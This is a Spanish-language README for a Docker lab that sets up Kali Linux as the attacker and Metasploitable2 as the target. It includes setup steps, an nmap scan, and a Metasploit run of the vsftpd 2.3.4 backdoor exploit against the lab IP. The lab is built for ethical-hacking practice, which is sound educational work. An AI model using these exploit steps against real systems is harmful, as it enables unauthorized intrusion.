# 🛡️ Laboratorio de Hacking Ético con Docker

Este repositorio contiene un entorno de laboratorio práctico para realizar ejercicios de hacking ético en un entorno seguro y aislado. Incluye:

- 🐧 Kali Linux como sistema atacante
- 🎯 Metasploitable2 como sistema vulnerable
- 🔗 Red virtual interna para simular ataques reales sin riesgos

---

## 🚀 Requisitos

- [Docker](https://www.docker.com/get-started)
- [Docker Compose](https://docs.docker.com/compose/install/)

---

## 🧰 Cómo usar

### 1. Clonar el repositorio (o crear tu propio docker-compose.yml)

```bash
git clone https://github.com/sterlux/ethical-hacking-lab.git
cd ethical-hacking-lab
```

### 2. Levantar los contenedores

```bash
docker-compose up -d
```

Esto levantará:

- `kali`: Kali Linux con bash interactivo
- `metasploitable`: Máquina con múltiples servicios vulnerables

### 3. Acceder al contenedor Kali

```bash
docker exec -it kali bash
```

### 4. Instalar herramientas en Kali

Dentro del contenedor Kali (una sola vez por sesión):

```bash
apt update
apt install -y metasploit-framework nmap net-tools curl iputils-ping
```

---

## 🧪 Escaneo de objetivos

Desde Kali, escanea Metasploitable:

```bash
nmap -sV 172.25.0.20
```

Deberías ver servicios vulnerables como:

- FTP (vsftpd 2.3.4)
- Telnet
- Apache 2.2.8
- Samba
- MySQL

---

## 🎯 Ejemplo de ataque con Metasploit

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.25.0.20
run
```

---

## ⚠️ Advertencia

**Este laboratorio contiene software vulnerable.**  
No expongas estos contenedores a redes públicas.  
Usa siempre en entornos cerrados y educativos.

---

## 📦 Créditos

- [Kali Linux Docker](https://hub.docker.com/r/kalilinux/kali-rolling)
- [Metasploitable2 Docker (tleemcjr)](https://hub.docker.com/r/tleemcjr/metasploitable2)

---

## ✅ Red interna

| Contenedor     | IP          | Rol      |
| -------------- | ----------- | -------- |
| kali           | 172.25.0.10 | Atacante |
| metasploitable | 172.25.0.20 | Objetivo |
